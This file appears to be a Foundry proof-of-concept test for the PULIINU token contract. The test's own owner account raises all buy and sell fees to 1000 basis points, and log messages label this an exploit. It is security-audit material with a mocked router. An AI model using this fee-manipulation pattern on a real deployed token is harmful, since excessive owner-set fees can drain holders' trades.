// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PULIINU.sol";

contract PULIINUFeeTest is Test {
    PULIINU token;
    address owner;
    address marketingWallet;
    
    uint256 constant EXCESSIVE_FEE = 1000; // Represents 10% per fee component
    uint256 constant DECIMALS = 10**9; // Token uses 9 decimals

    function setUp() public {
        owner = address(this);
        marketingWallet = makeAddr("marketing");
        address realRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address mockFactory = makeAddr("factory");
        address mockWETH = makeAddr("weth");
        address mockPair = makeAddr("pair");

        // Mock PancakeSwap router and factory calls
        vm.mockCall(
            realRouter,
            abi.encodeWithSignature("factory()"),
            abi.encode(mockFactory)
        );
        vm.mockCall(
            realRouter,
            abi.encodeWithSignature("WETH()"),
            abi.encode(mockWETH)
        );
        vm.mockCall(
            mockFactory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(mockPair)
        );

        // Deploy token
        token = new PULIINU(
            0,                    // deadBlocks
            1,                    // buy liquidity fee
            1,                    // buy marketing fee
            1,                    // sell liquidity fee
            1,                    // sell marketing fee
            payable(marketingWallet),
            1000 * DECIMALS,      // _supply
            100 * DECIMALS,       // numTokens
            100 * DECIMALS,       // maxWallet
            100 * DECIMALS,       // maxBuy
            100 * DECIMALS        // maxSell
        );
    }

    function testFeeManipulation() public {
        console.log("--- BEFORE-Trigger Fee State ---");
        // Record initial pre-manipulation fees
        (uint16 initialLiqBuy, uint16 initialMarketingBuy,,) = token.buyFee();
        (uint16 initialLiqSell, uint16 initialMarketingSell,,) = token.sellFee();
        
        console.log("Initial buyFee - liquidity: %d, marketing: %d", 
            initialLiqBuy, initialMarketingBuy);
        console.log("Initial sellFee - liquidity: %d, marketing: %d", 
            initialLiqSell, initialMarketingSell);

        console.log("--- Trigger SetFees ---");
        // Execute attack: set fees to excessively high values
        token.setBuyFee(
            uint16(EXCESSIVE_FEE), 
            uint16(EXCESSIVE_FEE), 
            uint16(EXCESSIVE_FEE), 
            uint16(EXCESSIVE_FEE)
        );
        
        token.setSellFee(
            uint16(EXCESSIVE_FEE), 
            uint16(EXCESSIVE_FEE), 
            uint16(EXCESSIVE_FEE), 
            uint16(EXCESSIVE_FEE)
        );

        console.log("--- AFTER-Trigger Fee State ---");
        // Record post-attack fees
        (uint16 newLiqBuy, uint16 newMarketingBuy,,) = token.buyFee();
        (uint16 newLiqSell, uint16 newMarketingSell,,) = token.sellFee();
        
        console.log("Updated buyFee - liquidity: %d, marketing: %d", 
            newLiqBuy, newMarketingBuy);
        console.log("Updated sellFee - liquidity: %d, marketing: %d", 
            newLiqSell, newMarketingSell);

        // Differential verification
        bool buyFeeChanged = (initialLiqBuy != newLiqBuy) || 
                            (initialMarketingBuy != newMarketingBuy);
        bool sellFeeChanged = (initialLiqSell != newLiqSell) || 
                             (initialMarketingSell != newMarketingSell);
        bool exploitSuccessful = (newLiqBuy == EXCESSIVE_FEE) &&
                                (newMarketingBuy == EXCESSIVE_FEE) &&
                                (newLiqSell == EXCESSIVE_FEE) &&
                                (newMarketingSell == EXCESSIVE_FEE);

        console.log("--- Vulnerability Verification ---");
        console.log("Buy fee changed: %s", buyFeeChanged ? "YES" : "NO");
        console.log("Sell fee changed: %s", sellFeeChanged ? "YES" : "NO");
        console.log("All fees set to 1000 basis points: %s", 
            exploitSuccessful ? "YES" : "NO");

        // Final verdict
        if (exploitSuccessful) {
            console.log("Vulnerability Exists: All fees were successfully set to excessively high values (1000 basis points each)");
        } else {
            console.log("Vulnerability not Exist: Fees were either unchanged or not set to target values");
        }
    }
}